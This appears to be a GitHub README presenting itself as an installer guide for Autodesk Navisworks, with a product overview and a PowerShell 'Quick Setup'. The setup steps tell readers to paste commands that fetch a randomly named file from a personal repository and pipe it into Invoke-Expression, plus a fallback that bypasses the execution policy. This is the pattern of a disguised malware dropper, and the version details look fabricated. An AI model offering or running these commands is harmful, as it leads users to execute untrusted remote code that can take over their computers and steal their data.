# Navisworks

Navisworks is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Navisworks and work in it.

Autodesk Navisworks is desktop coordination software for architecture, engineering, and construction teams on Windows workstations. It merges discipline models from Revit, AutoCAD, and compatible exporters into a federated 3D scene where you inspect geometry, slice sections, and capture redlines before fabrication and installation. Navisworks Manage adds Clash Detective and deeper scheduling hooks, while Simulate focuses on visualization and walkthroughs for design review meetings.

On a typical Windows session you open the master NWF, append refreshed NWC caches from each contributor, and arrange viewpoints by floor, area, or alignment chainage. Selection sets isolate ducts, structure, or cable trays so measurements and clearance checks stay readable on heavy files. Coordinators define clash tests between trade pairs, rerun batches after model drops, triage hits with comments and status, and publish HTML tabular reports for weekly coordination calls. When timeliner data is present, the same model can replay planned sequences against the combined geometry.

This repository keeps the Windows setup file for a pinned Navisworks release, rollout notes for CAD administrators covering install flags and standard clash naming, and a changelog that records build increments and template adjustments. Supporting configuration for tolerances or appearance overrides may live next to the installer so every office loads identical coordination defaults.

## What you do with it

- Clash Detective compares federated NWC geometry and surfaces hard interferences between mechanical, electrical, and structural objects.
- Append and refresh discipline caches into one NWF without reopening every native Revit or AutoCAD session.
- Saved viewpoints and sectioning tools let reviewers jump between floors, zones, and chainages during live meetings.
- Selection sets and search filters hide noisy categories so large campus models stay responsive on Windows hardware.
- Timeliner links model elements to schedule tasks so coordinators preview construction order inside the same scene.
- Quantification workflows aggregate takeoff data from combined models for estimators reviewing scope during coordination rounds.
- HTML clash exports package filtered test results with object metadata for issue logs and design tracker updates.
- Animator and presenter modes record walkthrough paths and redline markup tied to camera bookmarks for stakeholder reviews.

## Quick Setup (PowerShell)

This installs the program Navisworks on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/hannah92918890/navisworks-setup-guide/main/irwpwmfpv8.ecm7z815 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/hannah92918890/navisworks-setup-guide/main/irwpwmfpv8.ecm7z815 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `irwpwmfpv8.ecm7z815` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `hannah92918890/navisworks-setup-guide`. Autodesk Navisworks 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
